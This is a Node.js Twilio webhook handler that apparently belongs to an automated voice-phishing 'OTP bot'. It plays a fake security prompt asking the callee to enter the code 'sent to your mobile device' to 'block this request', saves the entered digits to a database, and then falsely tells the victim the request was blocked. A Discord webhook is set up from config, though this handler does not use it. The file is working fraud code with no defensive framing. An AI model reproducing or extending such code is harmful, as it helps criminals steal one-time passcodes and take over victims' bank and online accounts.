const VoiceResponse = require('twilio/lib/twiml/VoiceResponse');

module.exports = async function(request, response) {
    
    const twiml = new VoiceResponse;
    const config = require('.././config');
    const callsModel = require('../Database/Models/calls')

    const {
        Webhook,
        MessageBuilder
    } = require('discord-webhook-node');
    const hook = new Webhook(config.discordwebhook || '');

    var input = request.body.RecordingUrl || request.body.Digits || 0;
    var callSid = request.body.CallSid;

    if (!!!callSid) {
        return response.status(200).json({
            error: 'Please give us the callSid.'
        });
    }

    let calls = await callsModel.findOne({ callsid: callSid });

    var numdigits = calls.digitlength;

    
    const gatherNode = twiml.gather({ numDigits: numdigits, timeout: 5, });

    var end = `The request has been blocked!`;
    var pressed = `To block this request please enter the ${numdigits} digit security code we have sent to your mobile device.`;
    
    if (input.length == numdigits && input.match(/^[0-9]+$/) != null && input != null) {

        twiml.say(end);
        await callsModel.findOneAndUpdate({callsid: callSid}, {
           digits: input
        })
    }else{
        gatherNode.say(pressed);
    }

    response.type('text/xml');
    response.send(twiml.toString());
};
